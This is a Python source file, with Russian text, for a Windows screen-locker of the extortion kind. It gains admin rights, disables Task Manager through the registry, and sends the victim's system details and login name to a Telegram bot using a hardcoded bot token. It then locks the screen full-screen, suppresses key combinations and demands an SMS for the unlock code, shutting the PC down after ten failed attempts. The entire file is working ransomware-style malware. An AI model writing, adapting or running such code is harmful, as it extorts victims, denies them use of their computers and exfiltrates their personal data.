import tkinter as tk
from tkinter import messagebox
import sys
import os
import ctypes
import platform
import psutil
import requests
import subprocess
import threading
from functools import partial

# Настройки Telegram
BOT_TOKEN = '7931061343:AAHrP9OdybbGJXTvNbC7kWmkLcq5OIt8bFA'
CHAT_ID = None
ALLOWED_USER_IDS = []  # Добавьте свои ID пользователей

class SystemLocker:
    def __init__(self):
        self.attempts = 0
        self.root = None
        self.entry = None
        
        if not self.check_dependencies():
            self.shutdown_computer()
        
        if not self.is_admin():
            self.run_as_admin()
        
        self.start()

    def start(self):
        try:
            self.block_task_manager()
            self.send_system_info()
            self.init_ui()
        except Exception as e:
            self.show_error(f"Ошибка запуска: {str(e)}")
            self.shutdown_computer()

    def check_dependencies(self):
        try:
            import psutil
            import requests
            return True
        except ImportError:
            self.show_error("Установите зависимости: pip install psutil requests")
            return False

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def run_as_admin(self):
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, None, 1
            )
            sys.exit()
        except Exception as e:
            self.show_error(f"Ошибка прав администратора: {str(e)}")
            sys.exit(1)

    def get_system_info(self):
        try:
            info = [
                "🖥️ Системная информация:",
                f"ОС: {platform.system()} {platform.release()}",
                f"Архитектура: {platform.machine()}",
                f"Процессор: {platform.processor()}",
                f"Память: {psutil.virtual_memory().total // (1024**3)} GB",
                f"Диски: {', '.join([f'{p.device} ({psutil.disk_usage(p.mountpoint).total // (1024**3)} GB)' for p in psutil.disk_partitions(all=False)])}",
                f"Пользователь: {os.getlogin()}"
            ]
            return "\n".join(info)
        except Exception as e:
            return f"Ошибка сбора данных: {str(e)}"

    def send_system_info(self):
        def send():
            try:
                info = self.get_system_info()
                self.telegram_send(info)
            except Exception as e:
                print(f"Ошибка отправки: {str(e)}")
        
        threading.Thread(target=send, daemon=True).start()

    def telegram_send(self, message):
        try:
            if not CHAT_ID:
                self.get_chat_id()
            
            if CHAT_ID:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'},
                    timeout=15
                )
        except Exception as e:
            print(f"Ошибка Telegram: {str(e)}")

    def get_chat_id(self):
        global CHAT_ID
        try:
            response = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                timeout=15
            ).json()
            
            if response.get('result'):
                CHAT_ID = response['result'][-1]['message']['chat']['id']
        except Exception as e:
            print(f"Ошибка получения Chat ID: {str(e)}")

    def block_task_manager(self):
        try:
            subprocess.run(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System '
                '/v DisableTaskMgr /t REG_DWORD /d 1 /f',
                shell=True,
                check=True,
                capture_output=True
            )
        except subprocess.CalledProcessError as e:
            self.show_error(f"Ошибка блокировки: {e.stderr.decode()}")
            self.shutdown_computer()

    def unlock_task_manager(self):
        try:
            subprocess.run(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System '
                '/v DisableTaskMgr /t REG_DWORD /d 0 /f',
                shell=True,
                check=True
            )
        except Exception as e:
            self.show_error(f"Ошибка разблокировки: {str(e)}")

    def init_ui(self):
        self.root = tk.Tk()
        self.root.title("Системная блокировка")
        self.root.attributes("-fullscreen", True)
        self.root.configure(bg="#1a1a1a")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Блокировка сочетаний клавиш
        self.root.bind("<Alt-F4>", lambda e: None)
        self.root.bind("<Control-Alt-Delete>", lambda e: None)
        self.root.bind("<Control-Escape>", lambda e: None)
        
        self.create_widgets()
        self.focus_check()
        self.root.mainloop()

    def create_widgets(self):
        frame = tk.Frame(self.root, bg="#1a1a1a")
        frame.place(relx=0.5, rely=0.5, anchor="center")
        
        # Заголовок
        tk.Label(
            frame,
            text="Windows заблокирован!",
            font=("Arial", 28, "bold"),
            fg="#ff3333",
            bg="#1a1a1a"
        ).pack(pady=(0, 20))
        
        # Инструкция
        instruction_text = (
            "Для разблокировки необходимо отправить сис с текстом\n"
            "XXXX\n"
            "на номер\n"
            "YYYY\n\n"
            "В ответ вы получите сообщение с паролем для разблокировки"
        )
        tk.Label(
            frame,
            text=instruction_text,
            font=("Arial", 16),
            fg="#cccccc",
            bg="#1a1a1a",
            justify="center"
        ).pack(pady=(0, 30))
        
        # Поле ввода
        self.entry = tk.Entry(
            frame,
            font=("Arial", 20),
            width=15,
            bg="#333333",
            fg="white",
            justify="center"
        )
        self.entry.pack(pady=(0, 20), ipady=5)
        self.entry.bind("<Return>", lambda e: self.check_code())
        
        # Кнопка
        tk.Button(
            frame,
            text="РАЗБЛОКИРОВАТЬ",
            command=self.check_code,
            font=("Arial", 18, "bold"),
            bg="#ff3333",
            fg="white",
            activebackground="#ff5555",
            relief="flat"
        ).pack(pady=(0, 25))
        
        # Предупреждение
        warning_text = (
            "Внимание! Любые действия связанные с попыткой обмануть систему\n"
            "могут нанести вред вашему компьютеру и привести к потере важной информации."
        )
        tk.Label(
            frame,
            text=warning_text,
            font=("Arial", 12),
            fg="#ff9999",
            bg="#1a1a1a",
            justify="center"
        ).pack(pady=(10, 0))
        
        # Фокус
        self.entry.focus_set()

    def focus_check(self):
        self.root.focus_force()
        self.entry.focus_set()
        self.root.after(1000, self.focus_check)

    def check_code(self):
        code = self.entry.get().strip()
        if code == "12345":
            self.unlock_system()
        else:
            self.handle_wrong_code()

    def unlock_system(self):
        try:
            self.unlock_task_manager()
            self.root.destroy()
            sys.exit(0)
        except Exception as e:
            self.show_error(f"Ошибка разблокировки: {str(e)}")
            self.shutdown_computer()

    def handle_wrong_code(self):
        self.attempts += 1
        if self.attempts >= 10:
            self.shutdown_computer()
        else:
            messagebox.showerror(
                "Ошибка", 
                f"Неверный код! Осталось попыток: {10 - self.attempts}"
            )
            self.entry.delete(0, tk.END)

    def shutdown_computer(self):
        try:
            subprocess.run(["shutdown", "/s", "/t", "0"], check=True)
        except Exception as e:
            os._exit(1)

    def show_error(self, message):
        try:
            messagebox.showerror("Критическая ошибка", message)
        except:
            pass

if __name__ == "__main__":
    SystemLocker()